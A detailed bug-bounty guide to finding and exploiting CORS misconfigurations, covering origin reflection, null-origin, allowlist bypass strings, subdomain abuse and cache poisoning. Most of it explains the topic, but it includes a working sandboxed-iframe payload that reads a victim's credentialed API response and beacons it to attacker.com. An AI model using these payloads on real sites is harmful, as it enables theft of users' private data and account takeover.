# Cross-Origin Resource Sharing (CORS) Misconfiguration — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any endpoint that returns `Access-Control-Allow-Origin` (ACAO) — APIs, account/profile endpoints, GraphQL, JSON web services, OAuth/token endpoints, internal admin APIs, any response that reflects or relaxes the same-origin policy
**Platforms:** Kali/Linux first-class; Windows/WSL notes provided
**Companion files in this folder:**
- `CORS_ARSENAL.md` — every origin-reflection trick, `null`/regex/suffix bypass strings, fetch/XHR exfil snippets (copy-paste)
- `CORS_CHECKLIST.md` — the testing-order checklist you tick per endpoint
- `CORS_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable tooling (CORS scanner, origin-reflection prober, exfil HTML PoC, preflight tester)

> **Companion to the XSS / SSRF / JWT / CSRF / FileUpload / Recon guides.** Same philosophy: *find* is Part I–II, *get paid* is Part III–IV. CORS is the class most often reported at the **wrong severity** — "ACAO reflects my origin" is a *condition*, not *impact*. A reflected origin on a **public, unauthenticated, non-sensitive** response is **Informational**. The bounty is when a permissive ACAO + `Access-Control-Allow-Credentials: true` lets **your evil page read another user's authenticated, secret response** (their API key, PII, CSRF token, account data). Read Part III before you celebrate a reflected header.

---

> ### ⚡ READ THIS FIRST — why most CORS reports underpay (or get closed)
> 1. **Reflection alone is not the bug. The bug is reading cross-origin secret data.** CORS only matters when an attacker page on `evil.com` can make the victim's browser send the victim's **credentials** (cookies/Authorization) to the target and then **read the response**. That requires both a permissive **`Access-Control-Allow-Origin`** *and* **`Access-Control-Allow-Credentials: true`** — and a response that actually contains something secret.
> 2. **`ACAO: *` and `ACAC: true` cannot coexist** (browsers forbid it). So a literal `Access-Control-Allow-Origin: *` **cannot** be used to steal credentialed data — it can only read **public** data. People over-report `*`; it's usually **Info** unless the data behind it is sensitive *and* served without credentials (rare). The juicy bug is **origin *reflection* + credentials**.
> 3. **The whole game is: does the server echo an attacker-controlled Origin into ACAO with `ACAC: true`?** If `Origin: https://evil.com` comes back as `Access-Control-Allow-Origin: https://evil.com` **and** `Access-Control-Allow-Credentials: true` — that's the vulnerable pattern. Now find an endpoint that returns the victim's secrets.
> 4. **`null` is a real origin.** Sandboxed iframes, `data:`/`file:` documents, and some redirects send `Origin: null`. If the server allows `Origin: null` with credentials, any attacker page can become `null` (sandboxed iframe) and steal data. Always test `Origin: null`.
> 5. **Weak allowlist logic = bypass.** Most "secure" CORS is a regex/`startsWith`/`endsWith`/`contains` check. `target.com.evil.com`, `eviltarget.com`, `target.com%60.evil.com`, sub-domain takeover, and `null` are how you defeat it. (Part II.)
>
> **In plain words — the analogy (used throughout):** your browser is like a **librarian who holds the victim's private file** (their logged-in session cookies for `target.com`). When your page on `evil.com` asks *"read me target.com's private data about this user,"* the librarian normally **refuses** — that refusal is the Same-Origin Policy (SOP). **CORS is a note the server hands the librarian saying "it's fine to read my responses aloud to *these* websites."** A CORS *misconfiguration* is that note being written carelessly — "read to **whoever asks**" (origin reflection) or "read to anyone claiming to be **`null`**". Two things must both be true for it to pay: the note must name **your** site (or `null`), **and** it must say **"include the victim's login"** (`Access-Control-Allow-Credentials: true`) — otherwise the librarian reads a version with *no* login, which contains nothing private. The bug is never "the note mentions my origin" — it's **"from evil.com I read another logged-in user's secret."**
>
> **Where the money is (memorize this order):** ① **reflected Origin + `ACAC:true` on an endpoint returning API keys/session tokens/PII → cross-origin account takeover or full data theft (Critical/High)** → ② **`null` origin + credentials → same** → ③ **trusted-subdomain reflection where a subdomain has XSS/takeover → pivot to credentialed theft** → ④ **`ACAO:*` on sensitive but *non*-credentialed internal/API data** → ⑤ *then* reflection on public/unauthenticated responses as **Low/Info**, not headliners.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [CORS & the Same-Origin Policy — Anatomy & Why It Pays](#2-cors--the-same-origin-policy--anatomy--why-it-pays)
3. [Reconnaissance — Find Every CORS-Enabled, Credentialed, Secret-Bearing Endpoint](#3-reconnaissance--find-every-cors-enabled-endpoint)
4. [Baseline — Read the CORS Response Headers Correctly](#4-baseline--read-the-cors-response-headers-correctly)

**PART II — MISCONFIGURATION & BYPASS (work in this order)**
5. [Mapping the ACAO Logic — Reflection / Allowlist / Wildcard / Null](#5-mapping-the-acao-logic)
6. [Origin-Reflection Confirmation (the core bug)](#6-origin-reflection-confirmation)
7. [`null` Origin Exploitation](#7-null-origin-exploitation)
8. [Allowlist / Regex / Suffix-Prefix Bypasses](#8-allowlist--regex--suffix-prefix-bypasses)
9. [Trusted-Subdomain & Related-Domain Abuse](#9-trusted-subdomain--related-domain-abuse)
10. [Wildcard, Pre-flight & Non-Credentialed Cases](#10-wildcard-preflight--non-credentialed-cases)

**PART III — EXPLOITATION BY IMPACT (where the money is)**
11. [Cross-Origin Secret Theft (credentialed read → the crown jewel)](#11-cross-origin-secret-theft)
12. [Account Takeover via CORS (tokens, API keys, CSRF-token theft)](#12-account-takeover-via-cors)
13. [CORS + State Change (cross-origin write / CSRF amplification)](#13-cors--state-change)
14. [Chaining CORS with XSS, Subdomain Takeover & SSRF](#14-chaining-cors)
15. [Internal / Pre-prod / Non-Credentialed Sensitive Data](#15-internal--non-credentialed-sensitive-data)

**PART IV — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
16. [The Validity-First Mindset](#16-the-validity-first-mindset)
17. [False Positives — STOP reporting these](#17-false-positives--stop-reporting-these-auto-reject-list)
18. [Severity Calibration](#18-severity-calibration--how-triagers-really-rate-cors)
19. [Impact-Escalation Playbooks — "you found X, now do Y"](#19-impact-escalation-playbooks--you-found-x-now-do-y)
20. [Building a Professional, Safe PoC](#20-building-a-professional-safe-poc)
21. [Reporting, CWE/CVSS & De-duplication](#21-reporting-cwecvss--de-duplication)
22. [Automation & Red-Team Notes](#22-automation--red-team-notes)

**Appendices**
- [Appendix A — CORS Workflow Cheat Sheet](#appendix-a--cors-workflow-cheat-sheet)
- [Appendix B — CORS Attack Decision Tree](#appendix-b--cors-attack-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Each phase says *what to do*, *which § for detail*, and the *deliverable*. Numbered sections (1–22) are reference detail; this is the order you execute.

```
PHASE 0  RECON            → find EVERY endpoint that returns ACAO, especially AUTHENTICATED, SECRET-bearing ones (§3)
PHASE 1  BASELINE  ★      → read ACAO/ACAC/ACAM/ACAH correctly; does the endpoint reflect Origin? credentials? (§4)
PHASE 2  ACAO LOGIC       → classify: static / reflect-any / allowlist / wildcard / null-allowed (§5)
PHASE 3  BYPASS           → defeat the allowlist to get YOUR origin reflected WITH credentials:
                            reflection (§6) · null (§7) · regex/suffix/prefix (§8) · trusted-subdomain (§9)
PHASE 4  IMPACT  ⭐ (money)→ turn "my origin is trusted + creds" into harm:
                            read victim secrets (§11) · steal token/API key → ATO (§12) · CSRF-token theft / write (§13) ·
                            chain XSS/takeover/SSRF (§14) · non-credentialed sensitive data (§15)
PHASE 5  VALIDATE→REPORT  → validity (§16) · false-positive filter (§17) · severity+CVSS+CWE-942/CWE-346 (§18) ·
                            SAFE PoC: own test accounts, benign read (§20) · dedup (§21) · report template
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon.** Enumerate **every** endpoint that returns an `Access-Control-Allow-*` header — prioritise **authenticated** endpoints that return **secret** data (`/api/me`, `/account`, `/api/keys`, `/graphql`, token endpoints) (§3). *Deliverable:* a list of CORS endpoints tagged "credentialed? sensitive?".
2. **PHASE 1 — Baseline ⭐.** For each, send `Origin: https://evil.com` and read what comes back: is your origin **reflected** into ACAO? Is **`ACAC: true`** present? Does the response body contain secrets? (§4). *Deliverable:* confirmed reflection + credentials + sensitive body, or not.
3. **PHASE 2 — ACAO logic.** Classify how the server decides ACAO: static value / reflects any origin / allowlist of origins / wildcard `*` / allows `null` (§5). *Deliverable:* the server's CORS decision model.
4. **PHASE 3 — Bypass.** If there's an allowlist, defeat it so **your** attacker origin is reflected with credentials: pure reflection (§6), `null` (§7), regex/suffix/prefix tricks (§8), trusted-subdomain abuse (§9). *Deliverable:* an `Origin` you control that the server reflects + `ACAC: true`.
5. **PHASE 4 — Impact ⭐.** Convert that into the highest impact: read another user's secret response (§11), steal a token/API key → account takeover (§12), steal a CSRF token to chain a state-changing CSRF (§13), chain with XSS/subdomain-takeover/SSRF (§14); or report non-credentialed sensitive exposure (§15). *Deliverable:* a working cross-origin exfil PoC reading data your evil origin should never see.
6. **PHASE 5 — Validate → report.** Apply validity & false-positive filters (§16/§17), set a defensible CVSS/CWE-942 (§18), build a clean *safe* PoC with your own test accounts (§20), de-dup, write it up (§21). *Deliverable:* the submitted report.

Reference anytime: payloads → `CORS_ARSENAL.md`; checklist → `CORS_CHECKLIST.md`; scripts → `poc/`; playbooks **§19**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

CORS testing needs three things you control: a way to **set the `Origin` header** (Burp/curl), an **attacker-controlled web origin** to host the exfil PoC, and a **way to receive exfiltrated data** (your server / OOB).

| Tool | Job |
|------|-----|
| **Burp Suite** (Repeater) | set/replay the `Origin` header; read ACAO/ACAC; the core tool |
| **curl** | fast CLI reflection checks (`-H "Origin: https://evil.com" -I`) |
| **a web origin you control** (a VPS, ngrok, GitHub Pages, `attacker.com`) | host the `fetch()`/`XHR` exfil PoC the victim's browser runs |
| **interactsh / your server / webhook.site** | catch the exfiltrated cross-origin data (OOB) |
| **`poc/cors_scan.py`** | bulk-probe a URL list for reflection / null / suffix / prefix / wildcard |
| **`poc/exfil.html`** | the credentialed `fetch` PoC that reads + ships the victim response |
| **CORScanner / Corsy / `nuclei -tags cors`** | automated discovery of candidates (verify by hand) |
| **a second test account + a real browser** | to *prove* one user's page reads another user's data |

```bash
# Kali/WSL — quick reflection probe
curl -s -I -H "Origin: https://evil.com" https://api.target.com/me | grep -i 'access-control'
# Bulk scan a URL list
python3 poc/cors_scan.py -l live_urls.txt -o cors_hits.txt
# Automated discovery (verify findings manually!)
python3 Corsy/corsy.py -i live_urls.txt
nuclei -l live.txt -tags cors -o cors.txt
```
> **The attacker origin is non-negotiable.** A real PoC is an **HTML page on a domain you control** that, when a logged-in victim visits it, reads their data from the target and sends it to you. A curl screenshot of a reflected header is *evidence of the condition*, not the *exploit*. Host `poc/exfil.html` somewhere reachable.

> **Windows:** drive Burp/curl on Windows; run the Python `poc/` helpers and Corsy/CORScanner in **WSL**. Host the exfil page anywhere HTTPS-reachable (the target's pages are usually HTTPS, and mixed-content blocks an HTTP exfil page).

---

# 2. CORS & the Same-Origin Policy — Anatomy & Why It Pays

## 2.1 The Same-Origin Policy (SOP), in one breath
By default a page on `evil.com` **can send** a request to `api.target.com` (with the victim's cookies, if `credentials` are included) but **cannot read** the response — the browser blocks the read. CORS is the *opt-in* that lets a server say "this other origin **is** allowed to read my responses." A CORS **misconfiguration** is the server wrongly opting in `evil.com`.

> *In plain words:* "origin" = the scheme + host + port of a page (`https://evil.com`). The Same-Origin Policy is the browser's core rule: a page from one origin may *send* requests anywhere, but may only *read the response* from its own origin. That "send but can't read" split is the key subtlety — it's why CSRF (which only needs to *send*) is a different bug from CORS (which is about *reading*). CORS is the sanctioned exception: a server can opt specific other origins into reading its responses. The vuln is when it opts in origins it shouldn't.

## 2.2 The headers that matter
```
RESPONSE (server → browser, decides if evil.com may READ):
  Access-Control-Allow-Origin: <origin | * >     (ACAO)  ← which origin may read the response
  Access-Control-Allow-Credentials: true         (ACAC)  ← may the read include cookies/Authorization? THE multiplier
  Access-Control-Allow-Methods: GET, POST, ...    (ACAM)  ← (preflight) allowed methods
  Access-Control-Allow-Headers: X-Custom, ...      (ACAH)  ← (preflight) allowed request headers
  Access-Control-Expose-Headers: X-Secret         ← which response headers JS may read
  Access-Control-Max-Age: 600                      ← preflight cache time
REQUEST (browser → server):
  Origin: https://evil.com                         ← the calling page's origin (you control this in your PoC)
```

## 2.3 The only two combinations that pay

> *In plain words:* two response headers decide everything. **ACAO** (`Access-Control-Allow-Origin`) = *which* site may read the response. **ACAC** (`Access-Control-Allow-Credentials: true`) = *may that read include the victim's login* (cookies). You need **both** pointed your way: ACAO naming your origin **and** ACAC true. Miss either and there's no theft — ACAO-your-origin but no ACAC means the browser reads a logged-*out* copy (no secrets); ACAC true but ACAO not your origin means you're not allowed to read at all. The famous wildcard `ACAO: *` is a trap: the browser flatly **refuses to pair `*` with credentials**, so a bare `*` can only read *public* data — usually Info, not the payday. The payday is origin *reflection* (server echoes your origin) **plus** ACAC true.

```
VULNERABLE  → ACAO: https://evil.com   (reflected/attacker-controlled)  +  ACAC: true   → READ CREDENTIALED SECRETS  ⭐
SOMETIMES   → ACAO: *                  (wildcard)  + NO credentials      → read only PUBLIC data (Info, unless data is sensitive & creds not needed)
NEVER VALID → ACAO: *                  +  ACAC: true                     → browsers REJECT this; you cannot exploit it for creds
NOT A BUG   → ACAO: https://trusted.target.com (a fixed, correct value)  → working as intended
```

## 2.4 Why it pays
- **It defeats SOP for the attacker.** A permissive credentialed CORS turns "I can make the request but not read it" into "I read the victim's private response from my own evil page" — no XSS on the target needed.
- **It directly yields secrets → ATO.** The classic target is `/api/me` / `/account` / `/api/token` returning the victim's **API key, session token, email, or CSRF token**. Read it cross-origin → impersonate them.
- **It chains.** A reflected *trusted subdomain* + an XSS or takeover on that subdomain re-enables the credentialed read; CORS also amplifies CSRF by leaking the anti-CSRF token.

> **The mental model:** SOP is the wall that stops `evil.com` reading `target.com`'s authenticated responses. A CORS misconfig is a **door the server cut in that wall for the wrong people**. Severity = *whose* secrets you can read through the door, and whether those secrets grant takeover.

---

# 3. Reconnaissance — Find Every CORS-Enabled Endpoint

Most hunters test the one endpoint that obviously sets ACAO. The paying targets are **authenticated API endpoints that return secrets** and *also* relax CORS.

```
□ Authenticated API endpoints (priority):  /api/me  /account  /profile  /api/user  /settings  /api/keys
                                            /api/token  /oauth/token  /session  /api/v*/...  /graphql
□ Anything returning JSON with secrets:     API keys, session/JWT, email/PII, CSRF tokens, balances, messages
□ Subdomains:  api.  app.  internal.  admin.  dev.  staging.  legacy.  (each may have its own CORS policy)
□ Every endpoint that ALREADY returns an Access-Control-* header (grep your proxy history / a header scan)
□ JS-defined fetch/XHR targets (Recon §15 / the JS-files kit): grep for withCredentials, credentials:'include',
   Authorization headers, fetch('/api/...') — those endpoints are designed for cross-origin reads.
□ OAuth/SSO callbacks, token introspection, well-known config endpoints.
□ GraphQL endpoints (often return everything in one response → one CORS read = full account).
```
**How to discover at scale:** add `Origin: https://evil.com` to **every** request via a Burp Match-and-Replace / a session handling rule, then filter proxy history for responses containing `access-control-allow-origin: https://evil.com`. Or run `poc/cors_scan.py` over your `live_urls.txt`.

> **If this → then that:** an endpoint returns the victim's **API key / session token / email** in the body **and** sets `Access-Control-Allow-Credentials: true` → this is your top candidate; go straight to baseline (§4) then exfil (§11). A GraphQL endpoint with relaxed CORS is a jackpot — one read can dump the whole account.

---

# 4. Baseline — Read the CORS Response Headers Correctly

**Do this before any bypass.** Send a request with a controlled `Origin` and read exactly what the server reflects.

## 4.1 The baseline test
```bash
# Send YOUR origin; read what comes back:
curl -s -D - -o /dev/null -H "Origin: https://evil.com" https://api.target.com/api/me | grep -i 'access-control'
```
Interpret:
```
Access-Control-Allow-Origin: https://evil.com    ← REFLECTED your origin → strong candidate (check ACAC next)
Access-Control-Allow-Origin: *                    ← wildcard → only public data; cannot be credentialed (see §2.3/§10)
Access-Control-Allow-Origin: https://target.com   ← STATIC trusted value → not your origin → not (yet) exploitable
(no ACAO header at all)                            ← SOP fully enforced → no CORS bug here
Access-Control-Allow-Credentials: true             ← THE multiplier — combined with a reflected/null/attacker origin = the bug
```

## 4.2 The decision the baseline drives
```
□ ACAO == my evil origin  AND  ACAC: true   → VULNERABLE (credentialed). Go find/confirm the secret body (§11). ⭐
□ ACAO == my evil origin  AND  no ACAC      → reflected but non-credentialed → only matters if body is PUBLIC-but-sensitive (§15).
□ ACAO == *               AND  no ACAC      → public read only; Info unless sensitive non-cred data (§10/§15).
□ ACAO static/trusted only                  → try to get YOUR origin or null reflected via bypass (§5–§9).
□ No ACAO                                    → no CORS relaxation; move on (or test other endpoints).
```

## 4.3 Note what you'll need next
- **Does the body actually contain secrets?** Re-fetch the endpoint **as a logged-in user** (your own test account) and confirm the response holds something worth stealing (token/PII/CSRF token). No secret in the body → low impact even if reflected.
- **Is `ACAC: true` present?** Without it, a browser will **not** include the victim's cookies in the JS-readable request → you can't read *their* authenticated data (you'd read your own/unauth data only).
- **What triggers the reflection?** Any origin? Only `*.target.com`? Only `null`? This decides which Part II bypass you need.

> **Don't stop at a reflected header.** A reflected `Access-Control-Allow-Origin` **without** `ACAC: true`, or on a response with **no secret data**, is **Informational**. The finding is *reading another user's secret cross-origin* (§11). Confirm the body has secrets and credentials are allowed before you get excited.

---

# PART II — MISCONFIGURATION & BYPASS (work in this order)

> Full payload lists are in `CORS_ARSENAL.md`. These sections teach the *logic* of getting **your** origin trusted with credentials.

# 5. Mapping the ACAO Logic

Send a battery of `Origin` values and watch how ACAO responds — this reveals the server's decision model and therefore which bypass applies.

> *In plain words:* you're **probing how the server decides who's on the guest list.** Send a handful of different `Origin` headers and note which ones come back reflected in ACAO. The *pattern* tells you the rule: if *every* origin you send is echoed, there's no real check (reflect-any — the jackpot); if only `null` comes back, it allows the null origin; if only `something.target.com` works, it trusts its own subdomains (you'll need to control one). Once you know the rule, §6–§9 tell you exactly how to satisfy it with an origin **you** control.

```
Send these origins (one per request), record the ACAO returned:
  https://evil.com                  → reflected?            → REFLECT-ANY (§6)            ⭐ easiest, highest yield
  null                              → ACAO: null?           → NULL-ALLOWED (§7)           ⭐
  https://target.com.evil.com       → reflected?            → suffix/regex weakness (§8)
  https://eviltarget.com            → reflected?            → prefix/"contains" weakness (§8)
  https://sub.target.com            → reflected?            → trusted-subdomain (§9) → need XSS/takeover on a sub
  https://target.com.evil.com       → reflected?            → naive "endsWith allowed"… reversed (§8)
  https://eviltarget.com            ...
  https://target.com%60.evil.com    → reflected? (backtick) → browser-parsing trick (§8)
  https://nottarget.com             → reflected?            → broken validation
```
The pattern of which origins are accepted tells you the rule:
```
ANY origin reflected            → pure reflection (no validation)            → §6
only null reflected/allowed     → null-origin allowance                       → §7
*.target.com only               → subdomain trust                             → §9 (need a controllable subdomain)
target.com<something> accepted  → startsWith/regex-unescaped-dot bug          → §8
<something>target.com accepted  → "contains"/endsWith bug                     → §8
```

> **If this → then that:** the server reflects **any** origin → you already control a trusted origin; skip to impact (§11). It reflects only `*.target.com` → you need an attacker-controlled subdomain (subdomain takeover or an XSS on a sub) (§9). It reflects only `null` → use a sandboxed iframe to become `null` (§7).

---

# 6. Origin-Reflection Confirmation (the core bug)

The highest-yield misconfig: the server **echoes whatever `Origin` you send** into ACAO, with credentials.

```bash
curl -s -D - -o /dev/null -H "Origin: https://evil.com" https://api.target.com/api/me | grep -i 'access-control'
# Vulnerable response:
#   Access-Control-Allow-Origin: https://evil.com
#   Access-Control-Allow-Credentials: true
```
Confirm it's *true reflection* (not a coincidence): try several distinct random origins (`https://a1b2c3.com`, `https://x.attacker.test`) — if each is echoed back verbatim, it's reflect-any. This is the cleanest, most reportable pattern: **any** attacker page can read credentialed responses.

> **If this → then that:** reflect-any + `ACAC: true` + the endpoint returns secrets → you have a **High/Critical** cross-origin theft. Build `poc/exfil.html` with your origin and demonstrate reading a second test user's data (§11/§20). No bypass needed — this *is* the bug.

---

# 7. `null` Origin Exploitation

`null` is a legitimate origin the browser sends from: **sandboxed iframes**, `data:`/`file:` URLs, documents from a `redirect`, and some cross-origin POSTs. Many allowlists naively include `null` (for "local file testing"). If the server allows it **with credentials**, *any* attacker can forge `null`.

> *In plain words:* `null` isn't "no origin" — it's a real value the browser puts in the `Origin` header for certain page types, most usefully a **sandboxed iframe** (an `<iframe sandbox>` without `allow-same-origin` reports its origin as `null`). Developers often add `null` to the allowlist thinking it's harmless ("that's just local file testing"), but here's the catch: **anyone can *become* `null` on demand** — you just host a page that runs your fetch inside a sandboxed iframe. So "allow `null` + credentials" is exploitable by *any* website, which makes it just as bad as reflect-any (arguably worse, because it looks safe).

```bash
curl -s -D - -o /dev/null -H "Origin: null" https://api.target.com/api/me | grep -i 'access-control'
# Vulnerable:
#   Access-Control-Allow-Origin: null
#   Access-Control-Allow-Credentials: true
```
**How an attacker becomes `null`:** host a page that loads a **sandboxed iframe** which runs the fetch — a sandboxed iframe's origin is `null`:
```html
<!-- attacker page: the iframe's document has Origin: null -->
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="
  <script>
    fetch('https://api.target.com/api/me', {credentials:'include'})
      .then(r=>r.text()).then(d=>{ navigator.sendBeacon('https://attacker.com/log', d); });
  </script>">
</iframe>
```

> **If this → then that:** `Origin: null` is reflected with `ACAC: true` → exploitable by **any** website via a sandboxed iframe. This is as serious as reflect-any (often more, because devs think `null` is "safe"). Severity tracks the secret behind it (§11).

---

# 8. Allowlist / Regex / Suffix-Prefix Bypasses

When the server *validates* the origin against an allowlist, the validation is usually a flawed string check. Defeat the specific flaw. (Full set in `CORS_ARSENAL.md`.)

> *In plain words:* most "secure" CORS checks are lazy string tests, and each lazy test has a matching trick. If it just checks the origin **contains** `target.com`, register `target.com.evil.com` (a subdomain of *your* domain — it contains the string but is yours). If it checks the origin **ends with** `target.com`, register `nottarget.com`. If it **starts with** `https://target.com`, use `https://target.com.evil.com`. If it uses a regex with an un-escaped dot (`target.com` where `.` matches any char), `targetXcom.evil.com` slips through. The move is always: figure out the sloppy rule (from §5), then buy/point a domain **you control** that technically satisfies it.

```
Server logic (guessed from §5)            Bypass origin you register/use
─────────────────────────────────────────────────────────────────────────────────
"contains target.com"                     https://eviltarget.com          (your domain, contains the string)
                                          https://target.com.evil.com     (subdomain of your domain)
"endsWith target.com"                     https://nottarget.com           (you register nottarget.com)
                                          https://eviltarget.com
"startsWith https://target.com"           https://target.com.evil.com     (begins with the trusted prefix)
                                          https://target.com.evil.com:1337
regex with unescaped dot  target\.com →   https://targetXcom.evil.com  /  any char where . was meant to be literal
regex anchored loosely  /target\.com/     https://target.com.evil.com  /  https://evil.com/target.com (path, sometimes)
"any subdomain *.target.com"              → need a real subdomain you control (takeover / XSS), see §9
parser confusion (browser vs server)      https://target.com%60.evil.com  (backtick), https://target.com&.evil.com,
                                          https://target.com,evil.com — some servers split differently than browsers
trailing-dot / case                       https://target.com.   /  https://TARGET.com  (rare normalization gaps)
port/userinfo                             https://target.com.evil.com:443  /  https://target.com@evil.com (server-dependent)
```
**Method:** infer the rule from §5, register/control a domain that satisfies it, confirm the server reflects **your** domain with `ACAC: true`. You only need *one* attacker-controlled origin to be trusted.

> **If this → then that:** the check is "contains `target.com`" → buy/host `targetXYZ-evil.com` or use `target.com.<yourdomain>` and confirm reflection. The check is "any `*.target.com`" → you can't satisfy it with your own domain; pivot to **subdomain takeover / XSS on a real subdomain** (§9). Pick the bypass that matches the rule you mapped.

---

# 9. Trusted-Subdomain & Related-Domain Abuse

When ACAO trusts `*.target.com` (or a specific sibling like `app.target.com`), you can't forge it from `evil.com` — but you can if you **control content on a trusted subdomain**:

```
□ Subdomain takeover: a dangling CNAME (Recon kit + SSRF guide) on sub.target.com → you host your exfil page THERE →
   your page's origin IS *.target.com → CORS trusts it → credentialed read. (See Recon/takeover tooling.)
□ XSS on any trusted subdomain: reflected/stored XSS on app.target.com → run the fetch FROM that origin → trusted →
   read credentialed data from api.target.com. (XSS kit.)
□ Open redirect / dangling content on a trusted origin that lets you execute JS in that origin.
□ A less-protected sibling (dev./staging.) that is in the allowlist but itself hackable.
```

> **If this → then that:** CORS trusts only `*.target.com`, and Recon found a **dangling CNAME** subdomain → claim it (subdomain takeover), host `exfil.html` on it, and now your page *is* a trusted origin → full credentialed theft. This chain (takeover → CORS) turns two "medium-ish" bugs into one **High/Critical**.

---

# 10. Wildcard, Pre-flight & Non-Credentialed Cases

## 10.1 `Access-Control-Allow-Origin: *`
A literal `*` **cannot** be combined with `ACAC: true` (browsers ignore/forbid the pair). So `*` lets `evil.com` read the response **only without credentials** — i.e., only data the server returns to *anyone* unauthenticated. That's **Info** unless:
- the endpoint returns **sensitive data without needing auth** (an internal/pre-prod API, a leaky data endpoint) → see §15, or
- it's an **internal** service where reaching it at all is the issue (SSRF/host context).

## 10.2 Pre-flight (`OPTIONS`) — simple vs preflighted, and what it actually gates
> *In plain words:* a "preflight" is a permission-check request (`OPTIONS`) the browser fires *before* the real one — but only for requests it considers "non-simple." Why you care: for the classic theft (a credentialed `GET` that returns a JSON body), the request **is** simple, so **there's no preflight to worry about** — the browser just sends it and lets you read the body if ACAO/ACAC allow. You only need the preflight to *pass* when you're doing something fancier (a `PUT`/`DELETE`, sending JSON or a custom auth header, or reading a secret out of a *response header*). So don't over-complicate the common case: reflected origin + `ACAC:true` on a GET = done, no preflight gymnastics.

The browser sends a **pre-flight `OPTIONS`** before a request only when it's **"non-simple."** Knowing the rule decides whether you even need the preflight to pass:
```
SIMPLE request (NO preflight — the credentialed GET/POST just goes, and you read the body if ACAO/ACAC allow):
  • method ∈ {GET, HEAD, POST}
  • only "CORS-safelisted" headers (Accept, Accept-Language, Content-Language, Content-Type)
  • Content-Type ∈ {application/x-www-form-urlencoded, multipart/form-data, text/plain}   ← NOT application/json
NON-SIMPLE → PREFLIGHTED (a separate OPTIONS must succeed FIRST):
  • method ∈ {PUT, PATCH, DELETE, …}, OR a custom header (X-Auth, X-CSRF, Authorization), OR Content-Type: application/json
```
What the preflight gates (read the OPTIONS response):
```
Access-Control-Allow-Methods: …   → which methods the actual request may use (PUT/DELETE writes)
Access-Control-Allow-Headers: …   → which custom request headers are allowed (X-Auth, Authorization, Content-Type)
Access-Control-Max-Age: N          → how long the browser caches this preflight (a permissive cached preflight persists)
Access-Control-Expose-Headers: …  → which RESPONSE headers JS may READ (without it, JS sees only safelisted response headers)
```
> **Key insight:** for the classic theft — a credentialed **`GET`** of a JSON body that's *returned* — you usually **don't need the preflight at all** (it's a simple request; the browser sends it and lets you read the body if `ACAO`+`ACAC` permit). You only need a permissive preflight to (a) send **custom-header** authenticated reads (e.g. an `Authorization`/`X-Api-Key`-gated endpoint), (b) perform **JSON / `PUT` / `DELETE` writes** and read the result (§13.2), or (c) **read a secret that lives in a response header** (needs `Access-Control-Expose-Headers`). So: a reflected origin + `ACAC:true` + permissive `ACAM`/`ACAH` = full cross-origin *read and write* with custom headers — the strongest CORS posture for an attacker.

## 10.3 Non-credentialed `*` that still pays
```
□ Internal/admin API returning sensitive data with ACAO:* and NO auth required → any site can read it (§15).
□ Pre-prod/staging API mirroring prod data, ACAO:* , token-in-URL or no auth → cross-origin data theft.
□ A *-CORS JSON endpoint that leaks data based on IP/network position (intranet) → drive-by internal data theft.
```

> **If this → then that:** you see `ACAO: *` → check **(a)** is `ACAC: true` also present? (if so it's a *broken* config the browser won't honor for creds — usually not exploitable, sometimes worth a low note) and **(b)** does the endpoint return anything sensitive **without** auth? If neither, it's **Info** — don't lead with a bare `*`. Spend your effort finding **reflection + credentials** instead (§6).

## 10.4 CORS response cache poisoning (missing `Vary: Origin`)
A subtle, often-missed bug: when a server **reflects the `Origin`** into `Access-Control-Allow-Origin` and the response is **cached** (CDN/reverse-proxy) **without** `Vary: Origin`, the cache stores **one** response (with *your* origin in ACAO) and serves it to **everyone**.
```
□ Attacker (or a cache-warming request) sends Origin: https://evil.com → server reflects ACAO: https://evil.com →
  the cache stores that response under the URL's key (no Vary: Origin) → every subsequent visitor gets
  "Access-Control-Allow-Origin: https://evil.com" → evil.com can now read that (possibly credentialed) response for them.
□ Inverse / DoS: an attacker poisons the cache with an ACAO that BREAKS CORS for the legitimate frontend →
  the app's own cross-origin calls start failing for all users (availability impact).
□ Confirm: response has reflected ACAO + a cache indicator (Age / X-Cache: hit / Cache-Control: public) and NO
  Vary: Origin → repeat the request without the header and see the reflected ACAO served back from cache.
```
> **If this → then that:** reflected ACAO + cacheable + **no `Vary: Origin`** → you can poison the shared cache so the attacker-trusting ACAO is served to all users (mass cross-origin theft) **or** so legitimate CORS breaks (DoS). Cross-reference the **Host-Header kit §12** for the general web-cache-poisoning methodology (keyed vs unkeyed inputs, proving on a benign key).

## 10.5 Private Network Access (PNA) — `Access-Control-Allow-Private-Network` (internal/intranet reach)
A modern, often-missed CORS-adjacent control. **Private Network Access** (Chrome; formerly "CORS-RFC1918") gates a request **from a public site to a more-private network** (public→private, or private→localhost). The browser sends a **preflight** with `Access-Control-Request-Private-Network: true`, and the internal target must answer `Access-Control-Allow-Private-Network: true` (plus the normal ACAO/ACAC) for the call to proceed. When an **internal device/service answers it permissively**, any public web page the victim visits can talk to their **intranet/router/localhost** admin.
```
□ The classic target: a router / printer / IoT / dev service on 192.168.x.x / 10.x / 127.0.0.1 that returns
    Access-Control-Allow-Private-Network: true   (+ ACAO reflecting/`*`)  → a public attacker page reaches it via the
    victim's browser → CSRF-to-internal, read internal API responses, change router config (drive-by intranet attack).
□ Test: from a public origin, fetch the internal URL with credentials; watch the preflight — does the device reply
    `Access-Control-Allow-Private-Network: true`? If yes + permissive ACAO → exploitable.
□ Localhost dev servers (a debug/admin server on 127.0.0.1:port that allows it) → a public site reads/drives it.
□ Don't confuse with DNS-rebinding (SSRF kit): PNA is the CORS preflight layer; rebinding bypasses the origin check
    entirely. Both reach internal services — test both where in scope.
```
